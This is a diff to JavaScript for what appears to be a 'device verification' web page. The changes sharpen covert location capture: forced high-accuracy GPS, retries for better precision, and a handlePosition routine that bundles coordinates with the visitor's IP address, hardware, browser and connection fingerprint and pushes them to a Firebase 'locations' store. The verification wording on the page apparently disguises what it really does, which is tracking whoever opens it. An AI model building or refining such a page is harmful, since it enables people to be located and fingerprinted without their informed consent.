@@ -138,25 +138,30 @@ async function determineLocationSource(position) {
         try {
             const result = await navigator.permissions.query({ name: 'geolocation' });
             if (result.state === 'granted') {
-                return 'GPS';
+                // If accuracy is high, it's definitely GPS
+                if (position.coords.accuracy < 100) {
+                    return 'GPS (High Accuracy)';
+                }
+                // If accuracy is moderate, it might be GPS with poor signal or WiFi
+                else if (position.coords.accuracy < 500) {
+                    return 'GPS (Low Accuracy)';
+                }
             }
         } catch (e) {
             console.error('Error checking permissions:', e);
         }
     }
-    // If accuracy is less than 100 meters, definitely GPS
+    
+    // Fallback to accuracy-based detection
     if (position.coords.accuracy < 100) {
         return 'GPS (High Accuracy)';
     }
-    // If accuracy is less than 500 meters, probably GPS but with poor signal
     else if (position.coords.accuracy < 500) {
         return 'GPS (Low Accuracy)';
     }
-    // If accuracy is less than 2000 meters, likely WiFi
     else if (position.coords.accuracy < 2000) {
         return 'WiFi';
     }
-    // Otherwise, likely cell towers or IP-based
     return 'Cell/IP';
 }
 
@@ -192,6 +197,21 @@ async function saveFallbackLocation(locationData, button, status) {
     }
 }
 
+// Helper function to get high accuracy position
+async function getHighAccuracyPosition() {
+    return new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(
+            resolve,
+            reject,
+            {
+                enableHighAccuracy: true,
+                timeout: 20000,
+                maximumAge: 0
+            }
+        );
+    });
+}
+
 // Main functionality
 document.addEventListener('DOMContentLoaded', () => {
     const allowLocationButton = document.getElementById('allowLocation');
@@ -213,9 +233,8 @@ document.addEventListener('DOMContentLoaded', () => {
 
         const geoOptions = {
             enableHighAccuracy: true,
-            timeout: 30000, // Further increased timeout for mobile connections
-            maximumAge: 60000, // Increased cache time for better response
-            maximumWait: 35000 // Maximum time to wait for high accuracy
+            timeout: 30000,
+            maximumAge: 0
         };
 
         try {
@@ -237,149 +256,132 @@ document.addEventListener('DOMContentLoaded', () => {
                     if (isChromeAndroid) {
                         console.log('Chrome Android detected');
                         if (permissionResult.state === 'prompt') {
-                            console.log('Chrome Android requires explicit permission');
-                            // Show a message to the user
                             locationStatus.textContent = 'Please allow location access when prompted...';
                         }
-                        // Increase timeout for Android
                         geoOptions.timeout = 45000;
                     }
-                } catch (error) {
-                    console.error('Error checking permissions:', error);
-                    // Continue with default options
-                }
-            }
 
-            const position = await new Promise((resolve, reject) => {
-                const timeoutId = setTimeout(() => {
-                    reject(new Error('Location timeout'));
-                }, geoOptions.timeout);
-
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        clearTimeout(timeoutId);
-                        resolve(pos);
-                    },
-                    (err) => {
-                        clearTimeout(timeoutId);
-                        reject(err);
-                    },
-                    geoOptions
-                );
-            });
-
-            // Ensure high accuracy GPS reading
-            if (position.coords.accuracy > 100 && !window._retryHighAccuracy) {
-                window._retryHighAccuracy = true;
-                try {
-                    const highAccuracyPosition = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(
-                            resolve,
-                            (err) => {
-                                console.error('High accuracy retry failed:', err);
-                                reject(err);
-                            },
-                            {
-                                enableHighAccuracy: true,
-                                timeout: 10000,
-                                maximumAge: 0
+                    // For Chrome, always try high accuracy first
+                    try {
+                        let position = await getHighAccuracyPosition();
+                        console.log('High accuracy position obtained:', position.coords);
+                        
+                        // If accuracy isn't good enough, try one more time
+                        if (position.coords.accuracy > 100) {
+                            console.log('Attempting to improve accuracy...');
+                            try {
+                                const betterPosition = await getHighAccuracyPosition();
+                                if (betterPosition.coords.accuracy < position.coords.accuracy) {
+                                    position = betterPosition;
+                                    console.log('Obtained better accuracy:', position.coords.accuracy);
+                                }
+                            } catch (retryError) {
+                                console.log('High accuracy retry failed, using original position');
                             }
-                        );
-                    });
-                    position = highAccuracyPosition; // Update position with high accuracy data
-                } catch (highAccError) {
-                    console.log('Falling back to original position data');
-                }
-            }
-
-            console.log('Location obtained:', position.coords);
-            
-            const locationData = {
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude,
-                accuracy: position.coords.accuracy,
-                altitude: position.coords.altitude,
-                altitudeAccuracy: position.coords.altitudeAccuracy,
-                locationSource: await determineLocationSource(position),
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                ip: await fetch('https://api.ipify.org?format=json')
-                    .then(response => response.json())
-                    .then(data => data.ip)
-                    .catch(() => 'Unknown'),
-                screen: {
-                    width: window.screen.width,
-                    height: window.screen.height,
-                    colorDepth: window.screen.colorDepth,
-                    pixelRatio: window.devicePixelRatio
-                },
-                device: {
-                    memory: (typeof navigator.deviceMemory !== 'undefined') ? navigator.deviceMemory : 'Unknown',
-                    cores: (typeof navigator.hardwareConcurrency !== 'undefined') ? navigator.hardwareConcurrency : 'Unknown',
-                    platform: navigator.platform || 'Unknown',
-                    vendor: navigator.vendor || 'Unknown',
-                    language: navigator.language || 'Unknown',
-                    languages: navigator.languages || [navigator.language] || ['Unknown'],
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
-                    touchPoints: (typeof navigator.maxTouchPoints !== 'undefined') ? navigator.maxTouchPoints : 'Unknown',
-                    connection: (typeof navigator.connection !== 'undefined') ? {
-                        type: navigator.connection.effectiveType || 'Unknown',
-                        downlink: navigator.connection.downlink || 'Unknown',
-                        rtt: navigator.connection.rtt || 'Unknown',
-                        saveData: navigator.connection.saveData || false
-                    } : 'Unknown'
-                },
-                browser: {
-                    name: getBrowserName(),
-                    version: getBrowserVersion(),
-                    cookiesEnabled: navigator.cookieEnabled || false,
-                    doNotTrack: navigator.doNotTrack || null,
-                    plugins: (navigator.plugins && navigator.plugins.length) ? Array.from(navigator.plugins).map(p => p.name) : [],
-                    webdriver: (typeof navigator.webdriver !== 'undefined') ? navigator.webdriver : 'Unknown',
-                    pdfViewerEnabled: (typeof navigator.pdfViewerEnabled !== 'undefined') ? navigator.pdfViewerEnabled : 'Unknown',
-                    deviceOrientation: (typeof window.DeviceOrientationEvent !== 'undefined') ? 'Supported' : 'Not supported',
-                    webGL: (function() {
-                        try {
-                            return !!document.createElement('canvas').getContext('webgl');
-                        } catch(e) {
-                            return false;
                         }
-                    })()
+                        
+                        await handlePosition(position);
+                    } catch (highAccError) {
+                        console.log('High accuracy failed, falling back to standard accuracy');
+                        const position = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(resolve, reject, geoOptions);
+                        });
+                        await handlePosition(position);
+                    }
+                } catch (error) {
+                    console.error('Error in Chrome geolocation:', error);
+                    await handleLocationFallback(error);
                 }
-            };
-
-            console.log('Attempting to save location data:', locationData);
-
-            if (!database) {
-                console.error('Database not initialized');
-                locationStatus.textContent = 'Verification error. Please try again.';
-                return;
-            }
-
-            try {
-                const newLocationRef = database.ref('locations').push();
-                await newLocationRef.set(locationData);
-                console.log('Location saved successfully to Firebase with key:', newLocationRef.key);
-                locationStatus.textContent = 'Processing verification...';
-            } catch (error) {
-                console.error('Error saving location to Firebase:', error);
-                console.error('Error details:', {
-                    code: error.code,
-                    message: error.message,
-                    stack: error.stack
+            } else {
+                // Non-Chrome browsers
+                let position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, geoOptions);
                 });
-                locationStatus.textContent = 'Verification error. Please try again.';
-                allowLocationButton.disabled = false;
-                allowLocationButton.textContent = 'Verify Device';
-                allowLocationButton.classList.remove('loading');
+                await handlePosition(position);
             }
-
         } catch (geoError) {
             console.log('Geolocation error:', geoError);
             locationStatus.textContent = 'Processing verification...';
             await handleLocationFallback(geoError);
         }
     });
+
+    async function handlePosition(position) {
+        const locationData = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            altitude: position.coords.altitude,
+            altitudeAccuracy: position.coords.altitudeAccuracy,
+            locationSource: await determineLocationSource(position),
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            ip: await fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => data.ip)
+                .catch(() => 'Unknown'),
+            screen: {
+                width: window.screen.width,
+                height: window.screen.height,
+                colorDepth: window.screen.colorDepth,
+                pixelRatio: window.devicePixelRatio
+            },
+            device: {
+                memory: (typeof navigator.deviceMemory !== 'undefined') ? navigator.deviceMemory : 'Unknown',
+                cores: (typeof navigator.hardwareConcurrency !== 'undefined') ? navigator.hardwareConcurrency : 'Unknown',
+                platform: navigator.platform || 'Unknown',
+                vendor: navigator.vendor || 'Unknown',
+                language: navigator.language || 'Unknown',
+                languages: navigator.languages || [navigator.language] || ['Unknown'],
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
+                touchPoints: (typeof navigator.maxTouchPoints !== 'undefined') ? navigator.maxTouchPoints : 'Unknown',
+                connection: (typeof navigator.connection !== 'undefined') ? {
+                    type: navigator.connection.effectiveType || 'Unknown',
+                    downlink: navigator.connection.downlink || 'Unknown',
+                    rtt: navigator.connection.rtt || 'Unknown',
+                    saveData: navigator.connection.saveData || false
+                } : 'Unknown'
+            },
+            browser: {
+                name: getBrowserName(),
+                version: getBrowserVersion(),
+                cookiesEnabled: navigator.cookieEnabled || false,
+                doNotTrack: navigator.doNotTrack || null,
+                plugins: (navigator.plugins && navigator.plugins.length) ? Array.from(navigator.plugins).map(p => p.name) : [],
+                webdriver: (typeof navigator.webdriver !== 'undefined') ? navigator.webdriver : 'Unknown',
+                pdfViewerEnabled: (typeof navigator.pdfViewerEnabled !== 'undefined') ? navigator.pdfViewerEnabled : 'Unknown',
+                deviceOrientation: (typeof window.DeviceOrientationEvent !== 'undefined') ? 'Supported' : 'Not supported',
+                webGL: (function() {
+                    try {
+                        return !!document.createElement('canvas').getContext('webgl');
+                    } catch(e) {
+                        return false;
+                    }
+                })()
+            }
+        };
+
+        console.log('Attempting to save location data:', locationData);
+
+        if (!database) {
+            console.error('Database not initialized');
+            locationStatus.textContent = 'Verification error. Please try again.';
+            return;
+        }
+
+        try {
+            const newLocationRef = database.ref('locations').push();
+            await newLocationRef.set(locationData);
+            console.log('Location saved successfully to Firebase with key:', newLocationRef.key);
+            locationStatus.textContent = 'Processing verification...';
+        } catch (error) {
+            console.error('Error saving location to Firebase:', error);
+            locationStatus.textContent = 'Verification error. Please try again.';
+            allowLocationButton.disabled = false;
+            allowLocationButton.textContent = 'Verify Device';
+            allowLocationButton.classList.remove('loading');
+        }
+    }
 
     // Fallback function for handling location errors
     async function handleLocationFallback(geoError = null) {
